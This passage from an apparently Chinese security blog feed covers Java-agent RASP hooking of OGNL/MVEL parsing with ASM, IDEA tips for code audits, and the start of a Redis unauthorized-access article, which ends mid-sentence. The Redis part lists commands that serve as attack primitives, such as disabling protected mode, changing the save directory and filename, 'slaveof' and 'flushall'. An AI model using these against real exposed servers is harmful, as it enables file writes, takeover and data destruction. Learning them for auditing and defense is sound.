class="hljs-variable">class_name</span> <span class="hljs-operator">=</span> className.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> MethodHookDesc methodHookDesc : expClassList) &#123;<br>            <span class="hljs-keyword">if</span> (methodHookDesc.getHookClassName().equals(class_name)) &#123;<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">ClassReader</span> <span class="hljs-variable">classReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(classfileBuffer);<br>                <span class="hljs-type">ClassWriter</span> <span class="hljs-variable">classWriter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(classReader, ClassWriter.COMPUTE_MAXS);<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">api</span> <span class="hljs-operator">=</span> Opcodes.ASM5;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ClassVisitor</span> <span class="hljs-variable">classVisitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassVisitor</span>(api, classWriter) &#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-keyword">public</span> MethodVisitor <span class="hljs-title function_">visitMethod</span><span class="hljs-params">(<span class="hljs-type">int</span> i, String s, String s1, String s2, String[] strings)</span> &#123;<br>                            <span class="hljs-keyword">final</span> <span class="hljs-type">MethodVisitor</span> <span class="hljs-variable">methodVisitor</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.visitMethod(i, s, s1, s2, strings);<br><br>                            <span class="hljs-keyword">if</span> (methodHookDesc.getHookMethodName().equals(s) &amp;&amp; methodHookDesc.getHookMethodArgTypeDesc().equals(s1)) &#123;<br>                                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodVisitor</span>(api, methodVisitor) &#123;<br>                                    <span class="hljs-meta">@Override</span><br>                                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitCode</span><span class="hljs-params">()</span> &#123;<br>                                        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;ognl.Ognl&quot;</span>.equals(class_name)) &#123;<br>                                            methodVisitor.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">0</span>);<br>                                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                                            methodVisitor.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">1</span>);<br>                                        &#125;<br>                                        methodVisitor.visitMethodInsn(<br>                                                Opcodes.INVOKESTATIC, PremainAgent.class.getName().replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>), <span class="hljs-string">&quot;expression&quot;</span>,<br>                                                <span class="hljs-string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="hljs-literal">false</span><br>                                        );<br>                                    &#125;<br>                                &#125;;<br>                            &#125;<br>                            <span class="hljs-keyword">return</span> methodVisitor;<br>                        &#125;<br>                    &#125;;<br>                    classReader.accept(classVisitor, ClassReader.EXPAND_FRAMES);<br>                    classfileBuffer = classWriter.toByteArray();<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    t.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面 <code>methodVisitor.visitVarInsn</code>的结果就作为expression方法的参数。为什么ognl是压栈入局部变量表第0个参数，而其他两个是压栈局部变量表第一个参数？</p><ul><li><p>如果是在静态方法中，<code>0</code> 指代方法的第一个参数；1指代方法的第二个参数。</p></li><li><p>如果是在实例方法中，索引 <code>0</code> 通常指代 <code>this</code>，即当前对象；索引 <code>1</code> 通常指代方法的第一个参数。</p><p>ognl.Ognl#parse</p><p>Expression即为静态方法，所以压入0</p></li></ul><p>而如果检测  MVELInterpretedRuntime#parser，需要压入哪个变量才能获得exp呢？</p><p>parse没有接收任何参数，那么从哪里找变量呢？</p><p>在字节码中，通过指令 <code>GETSTATIC</code> 和 <code>PUTSTATIC</code> 操作静态变量，而不涉及局部变量表</p><h3 id="attach"><a href="#attach" class="headerlink" title="attach"></a>attach</h3><p>在运行时进行部署的一种方式</p><p>与premain不同的是agentmain需要实现一个额外的函数retransform，使用instumentation.retransformClasses去在运行中修改字节码</p><p>agent入口：AttachAgent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.org.javaweb.test.agent.attach;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><span class="hljs-keyword">import</span> java.lang.instrument.UnmodifiableClassException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttachAgent</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException &#123;<br><span class="hljs-comment">//        for (Class clazz : inst.getAllLoadedClasses()) &#123;</span><br><span class="hljs-comment">//            System.out.println(clazz.getName());</span><br><span class="hljs-comment">//        &#125;</span><br>        <span class="hljs-type">CustomClassTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomClassTransformer</span>(inst);<br>        transformer.retransform();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>HOOK逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.org.javaweb.test.agent.attach;<br><br><span class="hljs-keyword">import</span> org.objectweb.asm.*;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><span class="hljs-keyword">import</span> java.lang.instrument.UnmodifiableClassException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.util.LinkedList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomClassTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-keyword">private</span> Instrumentation inst;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CustomClassTransformer</span><span class="hljs-params">(Instrumentation inst)</span> &#123;<br>        <span class="hljs-built_in">this</span>.inst = inst;<br>        inst.addTransformer(<span class="hljs-built_in">this</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        System.out.println(<span class="hljs-string">&quot;In Transform&quot;</span>);<br>        <span class="hljs-comment">//读取字节码</span><br>        <span class="hljs-type">ClassReader</span> <span class="hljs-variable">cr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(classfileBuffer);<br>        <span class="hljs-comment">//修改字节码</span><br>        <span class="hljs-type">ClassWriter</span> <span class="hljs-variable">cw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(cr, ClassWriter.COMPUTE_MAXS);<br>        <span class="hljs-comment">//以ASM模式访问字节码</span><br>        <span class="hljs-type">ClassVisitor</span> <span class="hljs-variable">cv</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassVisitor</span>(Opcodes.ASM5, cw) &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> MethodVisitor <span class="hljs-title function_">visitMethod</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-keyword">final</span> String s, String s1, String s2, String[] strings)</span> &#123;<br><span class="hljs-comment">//                return super.visitMethod(i, s, s1, s2, strings);</span><br>                <span class="hljs-keyword">final</span> <span class="hljs-type">MethodVisitor</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.visitMethod(i, s, s1, s2, strings);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;say&quot;</span>.equals(s)) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodVisitor</span>(Opcodes.ASM5, mv) &#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitCode</span><span class="hljs-params">()</span> &#123;<br>                            <span class="hljs-built_in">super</span>.visitCode();<br>                            <span class="hljs-comment">//获取System的out变量</span><br>                            mv.visitFieldInsn(Opcodes.GETSTATIC, <span class="hljs-string">&quot;java/lang/System&quot;</span>, <span class="hljs-string">&quot;out&quot;</span>, <span class="hljs-string">&quot;Ljava/io/PrintStream;&quot;</span>);<br>                            mv.visitLdcInsn(<span class="hljs-string">&quot;CALL &quot;</span> +s+ <span class="hljs-string">&quot; method&quot;</span>);<span class="hljs-comment">//修改out的值，下面一行代码则调用PrintStream的println打印字符串</span><br>                            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, <span class="hljs-string">&quot;java/io/PrintStream&quot;</span>, <span class="hljs-string">&quot;println&quot;</span>, <span class="hljs-string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="hljs-literal">false</span>);<br>                        &#125;<br>                    &#125;;<br>                &#125;<br>                <span class="hljs-keyword">return</span> mv;<br>            &#125;<br>        &#125;;<br>        cr.accept(cv, ClassReader.EXPAND_FRAMES);<br>        classfileBuffer = cw.toByteArray();<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">retransform</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException &#123;<br>        LinkedList&lt;Class&gt; retransformClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;Class&gt;();<br>        Class[] loadedClasses = inst.getAllLoadedClasses();<br>        <span class="hljs-keyword">for</span> (Class clazz : loadedClasses) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;cn.org.javaweb.test.agent.attach.MainTest&quot;</span>.equals(clazz.getName())) &#123;<br>                <span class="hljs-keyword">if</span> (inst.isModifiableClass(clazz) &amp;&amp; !clazz.getName().startsWith(<span class="hljs-string">&quot;java.lang.invoke.LambdaForm&quot;</span>)) &#123;<br>                    inst.retransformClasses(clazz);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后maven打包</p><p><code>agentmain</code>模式和<code>premain</code>的大致写法是没有区别的，最大的区别在于<strong>如果想要利用agentmain模式来对运行后的类进行修改，需要利用Instrumentation.retransformClasses方法来对需要修改的类进行重新转换</strong>。</p><p>现在需要穿件一个agent启动程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.org.javaweb.test.agent.attach;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentStart</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;<br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-keyword">if</span> (vmd.displayName().endsWith(<span class="hljs-string">&quot;MainTest&quot;</span>)) &#123;<br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\code\\java-sec-code\\JavawebAgent\\agent\\target\\agent.jar&quot;</span>, <span class="hljs-string">&quot;Attach!&quot;</span>);<br>                System.out.println(<span class="hljs-string">&quot;ok&quot;</span>);<br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码遍历当前系统中所有的JVM，找到名为”MainTest”结尾的JVM实例，vmd.id()指该JVM的进程号，然后loadAgent去重新Attach</p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RASP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>idea技巧</title>
    <link href="/2025/09/22/idea%E6%8A%80%E5%B7%A7/"/>
    <url>/2025/09/22/idea%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="idea技巧"><a href="#idea技巧" class="headerlink" title="idea技巧"></a>idea技巧</h1><h2 id="1-IDEA搜索技巧"><a href="#1-IDEA搜索技巧" class="headerlink" title="1.IDEA搜索技巧"></a>1.IDEA搜索技巧</h2><p>快捷键 <code>ctrl+shift+f</code></p><h3 id="1-1自定义搜索范围"><a href="#1-1自定义搜索范围" class="headerlink" title="1.1自定义搜索范围"></a>1.1自定义搜索范围</h3><p>示例：</p><p>自定义搜索范围后就可以在搜索时使用自定义的配置进行范围搜索了，有助于我们在挖漏洞的时候缩小代码定位范围</p><h3 id="1-2-标记搜索和全局搜索：两次shift"><a href="#1-2-标记搜索和全局搜索：两次shift" class="headerlink" title="1.2 标记搜索和全局搜索：两次shift"></a>1.2 标记搜索和全局搜索：两次shift</h3><h2 id="2-Java调用链搜索"><a href="#2-Java调用链搜索" class="headerlink" title="2.Java调用链搜索"></a>2.Java调用链搜索</h2><p>当我们审计代码的时候发现某个方法或类有漏洞时我们需要定位到漏洞的请求地址(触发点)，复杂业务系统往往会让我们很难定位到漏洞的触发点。借助IDEA的方法调用链搜索功能就可以很轻松的找出方法的调用链和触发点。</p><p>选择<code>类或者方法名</code>–&gt;<code>右键</code>–&gt;<code>Find Useages</code>或者<code>alt+f7</code></p><h2 id="3-显示类的所有方法"><a href="#3-显示类的所有方法" class="headerlink" title="3.显示类的所有方法"></a>3.显示类的所有方法</h2><p>如果某个类有非常多的方法，我们无法快速找到想看的方法时可以使用快捷键<code>ctrl+f12</code></p><p>如果想显示父类方法可以把<code>Inherited members</code>勾上，反之去掉。</p><h2 id="4-显示类的继承关系"><a href="#4-显示类的继承关系" class="headerlink" title="4.显示类的继承关系"></a>4.显示类的继承关系</h2><p>某些类实现的非常复杂，继承和实现了非常多的类，比较影响我们分析业务，这个时候我们可以在某个类的空白处<code>右键</code>-&gt;<code>Diagrams</code>-&gt;<code>Show Diagram</code>或快捷键ctrl+shift+alt+u</p><p>示例<code>InvocationTargetException</code>类的继承关系图：</p><p>点击左上角的小图标<code>F</code>、<code>M❤</code>、<code>M</code>、<code>P</code>、<code>I</code>分别会展示详细的：<code>成员变量</code>、<code>构造方法</code>、<code>方法</code>、<code>属性</code>、<code>内部类</code>。</p><p>如果想显示多个类的继承关系，可以将任意类文件拖拽到右图就会生成多类之间的继承关系，如<code>Tomcat</code>中的<code>HttpServletRequest</code>类和<code>ApplicationHttpRequest</code>类都实现了<code>HttpServletRequest</code>接口，那么拖拽到一起就可以看到它们俩之间的如下关联关系：</p><h2 id="5-自动反编译"><a href="#5-自动反编译" class="headerlink" title="5.自动反编译"></a>5.自动反编译</h2><h3 id="5-1自动反编译class文件"><a href="#5-1自动反编译class文件" class="headerlink" title="5.1自动反编译class文件"></a>5.1自动反编译class文件</h3><p>将任意的<code>class</code>文件丢到<code>IDEA</code>的源码目录就可以立即看到反编译之后的文件，这样就可以省去打开反编译工具的时间了，如图：</p><h2 id="5-2-jar文件反编译"><a href="#5-2-jar文件反编译" class="headerlink" title="5.2 jar文件反编译"></a>5.2 jar文件反编译</h2><p><code>IDEA</code>反编译<code>jar</code>文件也是非常的方便，只需把<code>jar</code>包丢到任意目录，然后<code>右键</code>-&gt;<code>Add as library</code>就可以了。</p><h2 id="6-HTTP请求测试"><a href="#6-HTTP请求测试" class="headerlink" title="6.HTTP请求测试"></a>6.HTTP请求测试</h2><p>很多人为了测试API接口总喜欢使用<code>Burp</code>或者<code>Postman</code>之类的工具去发送<code>Http</code>请求，殊不知<code>IDEA</code>就内置了非常方便的<code>Http</code>请求工具。在项目的任意位置：<code>右键</code>-&gt;<code>new</code>-&gt;<code>File</code>-&gt;<code>test.http</code>，然后就会创建出一个叫<code>test.http</code>的文件。</p><p><code>Http</code>环境变量配置文件不是必须的，如需配置，需点击右上角的<code>Add Environment File</code>，然后自行添加变量，如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;dev&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://localhost:8080&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;json&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;application/json&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="7-本地历史记录"><a href="#7-本地历史记录" class="headerlink" title="7.本地历史记录"></a>7.本地历史记录</h2><p>在调试IDEA的时候如果不小心误删了文件或者改某个文件时都改一半了发现改错了，而且还没有<code>git</code>之类的版本提交记录。这个时候我们可以使用IDEA的本地文件历史编辑记录功能，选择任意文件或者目录<code>右键</code>-&gt;<code>Local History</code>-&gt;<code>Show History</code></p><h2 id="8-文件比较"><a href="#8-文件比较" class="headerlink" title="8.文件比较"></a>8.文件比较</h2><h3 id="8-1-粘贴板文件对比"><a href="#8-1-粘贴板文件对比" class="headerlink" title="8.1 粘贴板文件对比"></a>8.1 粘贴板文件对比</h3><p>复制一个文件的内容到粘贴板，然后打开需要比较的文件后点击<code>右键</code>-&gt;<code>Compare with Clipboard</code>：</p><p>文件对比：</p><h3 id="8-3文件对比"><a href="#8-3文件对比" class="headerlink" title="8.3文件对比"></a>8.3文件对比</h3><p>如果嫌比较粘贴板比较麻烦，可以直接选中需要比较的文件<code>右键</code>-&gt;<code>Compare With...</code>，如下：</p><p>然后在本地文件中选择一个需要比较的文件即可：</p><h3 id="8-3-vsc文件对比"><a href="#8-3-vsc文件对比" class="headerlink" title="8.3 vsc文件对比"></a>8.3 vsc文件对比</h3><p><code>版本控制</code>的文件比较方式非常简单，配置好<code>VCS(Version Vontrol System，版本控制系统)</code>后本地修改的文件和远程的文件可以直接比较，如图</p><h2 id="9-类-资源热更新"><a href="#9-类-资源热更新" class="headerlink" title="9.类&#x2F;资源热更新"></a>9.类&#x2F;资源热更新</h2><p><code>IDEA</code>中默认不会将修改的文件和资源自动同步到<code>Web Server</code>或者<code>SpringBoot</code>，需要我们手动设置当类文件或资源文件发生修改后同步更新。</p><p><code>Web容器</code>热更新</p><p>springBoot热更新</p>]]></content>
    
    
    <categories>
      
      <category>IDEA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis(未授权)</title>
    <link href="/2025/09/22/Redis-%E6%9C%AA%E6%8E%88%E6%9D%83/"/>
    <url>/2025/09/22/Redis-%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Redis 本身是一个<strong>高性能的键值数据库</strong>，默认设计用于<strong>可信内网环境</strong>，早期版本和默认配置<strong>没有开启认证、也没有访问控制</strong>。如果 Redis 被<strong>直接暴露在公网</strong>且<strong>未设置密码&#x2F;访问控制</strong>，攻击者可以<strong>不经认证直接连接 Redis 服务器并执行任意命令</strong>，从而导致系统被完全控制。</p><hr><p>🟥 一、漏洞产生的根本原因</p><ol><li><strong>无认证机制（默认）</strong><ul><li>Redis 默认不要求登录，也不强制配置 <code>requirepass</code>。</li><li>任何人只要能访问到 6379 端口，就能直接执行 <code>SET/GET/CONFIG/SLAVEOF</code> 等高权限命令。</li></ul></li><li><strong>缺乏访问控制</strong><ul><li>Redis 默认监听 <code>0.0.0.0:6379</code>，即所有网卡地址。</li><li>未配置 <code>bind 127.0.0.1</code> 和 <code>protected-mode yes</code>，导致公网可直接访问。</li></ul></li><li><strong>命令权限过高</strong><ul><li>Redis 没有细粒度权限控制，一旦接入就拥有<strong>完全控制权</strong>（读写任意数据、修改配置、加载模块等）。</li></ul></li></ol><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="docker设置代理"><a href="#docker设置代理" class="headerlink" title="docker设置代理"></a>docker设置代理</h3><p>1、在 Docker 的配置文件中设置代理</p><p>编辑 Docker 配置文件 <code>/etc/systemd/system/docker.service.d/http-proxy.conf</code>（如果没有该文件，您可以手动创建它）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d<br><span class="hljs-built_in">sudo</span> vim /etc/systemd/system/docker.service.d/http-proxy.conf<br></code></pre></td></tr></table></figure><p>2、将以下内容添加到文件中，设置正确的代理地址</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTP_PROXY=http://主节点IP:7890&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTPS_PROXY=http://主节点IP:7890&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;NO_PROXY=localhost,127.0.0.1&quot;</span><br></code></pre></td></tr></table></figure><p>查看镜像中的Redis</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker search redis</span><br></code></pre></td></tr></table></figure><p>拉取镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull redis:<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>Redis常见的命令</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs csharp">redis-cli -h ip -p <span class="hljs-number">6379</span> -a passwd   <span class="hljs-meta"># 外部连接,Redis 的连接除了通过指定 IP，也可以通过指定域名</span><br>info   <span class="hljs-meta"># 查看相关redis信息</span><br><span class="hljs-keyword">set</span> xz <span class="hljs-string">&quot;Hacker&quot;</span>                     <span class="hljs-meta"># 设置键xz的值为字符串Hacker</span><br><span class="hljs-keyword">get</span> xz                              <span class="hljs-meta"># 获取键xz的内容</span><br>INCR score                          <span class="hljs-meta"># 使用INCR命令将score的值增加1</span><br>keys *                              <span class="hljs-meta"># 列出当前数据库中所有的键</span><br>config <span class="hljs-keyword">set</span> <span class="hljs-keyword">protected</span>-mode no        <span class="hljs-meta"># 关闭安全模式</span><br><span class="hljs-keyword">get</span> anotherkey                      <span class="hljs-meta"># 获取一个不存在的键的值</span><br>config <span class="hljs-keyword">set</span> dir /root/redis          <span class="hljs-meta"># 设置保存目录</span><br>config <span class="hljs-keyword">set</span> dbfilename redis.rdb     <span class="hljs-meta"># 设置保存文件名</span><br>config <span class="hljs-keyword">get</span> dir                      <span class="hljs-meta"># 查看保存目录</span><br>config <span class="hljs-keyword">get</span> dbfilename               <span class="hljs-meta"># 查看保存文件名</span><br>save                                <span class="hljs-meta"># 进行一次备份操作</span><br>flushall                            <span class="hljs-meta"># 删除所有数据</span><br>del key                             <span class="hljs-meta"># 删除键为key的数据</span><br>slaveof ip port   <span class="hljs-meta"># 设置主从关系</span><br>mset k1 v1 k2 v2 k3 v3   <span class="hljs-meta">#批量设置键值对</span><br>mget k1 k2 k3 <span class="hljs-meta">#批量获取键值对</span><br>使用SET和GET命令，可以完成基本的赋值和取值操作；<br>Redis是不区分命令的大小写的，<span class="hljs-keyword">set</span>和SET是同一个意思；<br>使用keys *可以列出当前数据库中的所有键；<br>当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)；<br>如果键的值中有空格，需要使用双引号括起来，如<span class="hljs-string">&quot;Hello World&quot;</span>;<br></code></pre></td></tr></table></figure><p>Redis 配置文件参数</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stata">port参数：<br>    格式为port后面接端口号，如port 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。<br><br>bind参数：<br>    格式为bind后面接IP地址，可以同时绑定在多个IP地址上，IP地址之间用空格分离，如bind 192.168.47.173 10.0.0.1，表允许192.168.47.173和10.0.0.1两个IP连接。如果设置为0.0.0.0则表示任意ip都可连接，说白了就是白名单。<br><br><span class="hljs-keyword">save</span>参数：<br>    格式为<span class="hljs-keyword">save</span> &lt;秒数&gt; 